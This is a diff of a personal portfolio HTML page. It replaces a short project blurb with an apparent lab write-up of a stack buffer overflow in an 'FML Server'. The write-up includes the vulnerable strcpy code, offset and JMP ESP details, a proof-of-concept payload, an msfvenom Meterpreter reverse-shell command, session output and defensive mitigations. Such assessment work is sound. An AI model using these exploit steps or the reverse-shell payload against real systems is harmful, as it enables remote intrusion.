@@ -3,26 +3,21 @@
 <head>
   <title>Buffer Overflow Exploit — Noah Cosamano</title>
   <link rel="stylesheet" href="style.css">
-
-  <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;600&display=swap" rel="stylesheet">
 </head>
 
 <body>
 
-<!-- NAVBAR -->
 <nav>
     <a href="index.html" class="nav-link">Home</a>
-
     <div class="nav-links">
         <div class="dropdown">
-            <a href="work.html" class="nav-link">Work</a>
+            <a href="work.html" class="nav-link active">Work</a>
             <div class="dropdown-content">
                 <a href="nids.html">NIDS</a>
                 <a href="buffer-overflow.html">Buffer Overflow</a>
             </div>
         </div>
-
         <div class="dropdown">
             <a href="about.html" class="nav-link">About</a>
             <div class="dropdown-content">
@@ -30,7 +25,6 @@
                 <a href="skills.html">Skills</a>
             </div>
         </div>
-
         <div class="dropdown">
             <a href="contact.html" class="nav-link">Contact</a>
             <div class="dropdown-content">
@@ -41,46 +35,113 @@
     </div>
 </nav>
 
-<!-- PAGE HEADER -->
-<section class="project-hero">
-    <h1>Buffer Overflow Exploit (C)</h1>
-    <p>
-        Buffer overflow exploit in C demonstrating how unsafe input handling
-        can overwrite memory, redirect execution, and execute arbitrary code.
-    </p>
+<section class="work-hero">
+    <h1>FML Server Exploit Assessment</h1>
+    <h2>Remote Code Execution via Buffer Overflow</h2>
+    <p>A comprehensive security assessment involving source code audit, stack memory corruption, and the development of a weaponized exploit to achieve a Meterpreter shell.</p>
 </section>
 
-<!-- PROJECT DETAILS -->
-<section class="project-details">
+<section class="container" style="max-width: 900px; margin: auto; padding: 40px 20px;">
+    
+    <div class="card" style="margin-bottom: 40px;">
+        <h2>1. Vulnerability Discovery</h2>
+        <p>During a source code audit of <code>parse.c</code>, I identified a classic buffer overflow in the <code>isASCII()</code> function. The root cause is a size mismatch between the calling function's 1000-byte <code>rawCommand</code> buffer and a locally defined 500-byte <code>cmdToParse</code> array.</p>
+        
+        <div class="code-container">
+<pre><code>// Source: parse.c
+int isASCII(char* rawInput) {
+    char cmdToParse[500]; // Insufficient buffer size
+    // ...
+    strcpy(cmdToParse, rawInput); // Vulnerable function: No bounds checking
+    // ...
+}</code></pre>
+        </div>
+        <p>The use of <code>strcpy()</code> allows an attacker to write past the allocated 500 bytes, overwriting adjacent memory on the stack, including the <strong>EBP</strong> (Base Pointer) and <strong>EIP</strong> (Instruction Pointer).</p>
+    </div>
 
-    <h2>Overview</h2>
-    <p>
-        This project is an 8-page technical report analyzing a buffer overflow
-        vulnerability in a C program. It explores how improper bounds checking
-        allows attackers to manipulate stack memory and control program execution.
-    </p>
+    <div class="impl-block">
+        <h3>2. Stack Mapping & Register Control</h3>
+        <p>Using a custom Python fuzzer, I determined that an offset of exactly <strong>502 bytes</strong> was required to reach the EBP, followed by 4 bytes to control the EIP. I verified this by overwriting the EIP with <code>0x42424242</code> ('BBBB').</p>
+        
+        <div class="code-container">
+<pre><code># Proof of Concept: Redirecting EIP to 42424242
+import socket
+payload = b"A" * 502 + b"BBBB" + b"C" * 20
+cmd = b"upload upload " + payload
+# ... socket connection logic ...
+</code></pre>
+        </div>
+        <div class="results-box" style="background: #fdf2f2; border-left: 4px solid #e53e3e;">
+            <strong>Debugger State at Crash:</strong><br>
+            EBP: 41414141 ('AAAA')<br>
+            EIP: 42424242 ('BBBB') <br>
+            <em>Result: Access violation when executing 0x42424242</em>
+        </div>
+    </div>
 
-    <h2>Key Concepts</h2>
-    <ul>
-        <li>Stack memory layout and function call structure</li>
-        <li>Buffer overflow vulnerability identification</li>
-        <li>Return address overwriting</li>
-        <li>Exploit payload construction</li>
-    </ul>
+    <div class="impl-block">
+        <h3>3. Finding the Pivot (JMP ESP)</h3>
+        <p>To execute code, I needed to redirect the EIP to a location I controlled. Using <strong>x32dbg</strong>, I searched for a <code>JMP ESP</code> instruction within the application's memory to "bounce" the execution flow back onto the stack where my shellcode would reside.</p>
+        <ul>
+            <li><strong>Instruction Found:</strong> <code>FFE4</code> (JMP ESP)</li>
+            <li><strong>Memory Address:</strong> <code>0x561586B3</code> (Note: Address must be provided in Little Endian format: <code>\xb3\x86\x15\x56</code>)</li>
+        </ul>
+    </div>
 
-    <h2>Tools & Technologies</h2>
-    <p>C, GDB, low-level memory analysis, assembly inspection</p>
+    <div class="impl-block">
+        <h3>4. Weaponization & Bad Byte Evasion</h3>
+        <p>Before generating the payload, I identified "Bad Bytes" (<code>\x00</code> and <code>\x0a</code>) that would terminate the <code>strcpy()</code> prematurely. I used <strong>msfvenom</strong> with the <strong>shikata_ga_nai</strong> encoder to generate an encoded Meterpreter reverse shell.</p>
+        
+        <div class="code-container">
+<pre><code># Generating the payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.204.39 LPORT=9999 \
+-b "\x00\x0a" -f python -e x86/shikata_ga_nai</code></pre>
+        </div>
+        <p>I prepended the shellcode with a 20-byte <strong>NOP Sled</strong> (<code>\x90</code>) to ensure successful execution even if the stack pointer shifted slightly.</p>
+    </div>
 
-    <h2>Report</h2>
-    <p>
-        <a href="media/buffer-overflow-report.pdf" target="_blank">
-            View Full Report →
-        </a>
-    </p>
+    <div class="card" style="background: #1a1a1a; color: #00ff00; font-family: monospace;">
+        <h3>[+] Exploit Execution Successful</h3>
+        <p>> Sending stage (176198 bytes) to 192.168.205.46...<br>
+           > Meterpreter session 10 opened (192.168.204.39:9999 -> 192.168.205.46:4444)<br>
+           > <strong>meterpreter ></strong> getuid<br>
+           Server username: FML-SERVER\Noah</p>
+    </div>
 
+    <div class="card" style="margin-top: 40px; border-top: 5px solid #555;">
+        <h2>Defensive Recommendations</h2>
+        <p>To secure the FML Server against similar memory corruption attacks, the following mitigations are essential:</p>
+        <ul style="line-height: 1.8;">
+            <li><strong>Safe Functions:</strong> Replace <code>strcpy()</code> with <code>strncpy()</code> to enforce buffer length limits.</li>
+            <li><strong>Stack Canaries:</strong> Enable compiler-generated "cookies" that detect stack smashing before function return.</li>
+            <li><strong>ASLR & DEP:</strong> Implement Address Space Layout Randomization and Data Execution Prevention to make memory addresses unpredictable and the stack non-executable.</li>
+            <li><strong>Control Flow Guard (CFG):</strong> Use Microsoft's CFG to restrict indirect call/jump targets.</li>
+        </ul>
+    </div>
+
+    <section class="report-section" style="margin: 60px 0; padding-top: 40px; border-top: 1px solid #eee;">
+    <h2 style="margin-bottom: 20px;">Full Technical Report</h2>
+    <p style="margin-bottom: 25px;">For a deep dive into the memory registers and full fuzzer source code, view the 8-page assessment below.</p>
+    
+    <div class="card" style="display: flex; align-items: center; justify-content: space-between; background: #f9f9f9; border: 1px solid #ddd; margin-bottom: 30px;">
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <span style="font-size: 24px;">📄</span>
+            <strong>FML-Server-Exploit-Report.pdf</strong>
+        </div>
+        <a href="/media/FML-Server-Exploit.pdf" target="_blank" class="nav-link active" style="padding: 10px 20px; border-radius: 5px; text-decoration: none;">View Fullscreen</a>
+    </div>
+
+    <div style="height: 800px; width: 100%; border: 1px solid #ccc; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
+        <object data="/media/FML-Server-Exploit.pdf" type="application/pdf" width="100%" height="100%">
+            <div style="padding: 40px; text-align: center;">
+                <p>It looks like your browser isn't displaying the PDF. No worries!</p>
+                <a href="/media/FML-Server-Exploit.pdf" style="color: #007bff; text-decoration: underline;">Click here to download and view the report.</a>
+            </div>
+        </object>
+    </div>
+</section>
 </section>
 
-<!-- FOOTER -->
 <footer>
     <p>© 2026 Noah Cosamano</p>
 </footer>
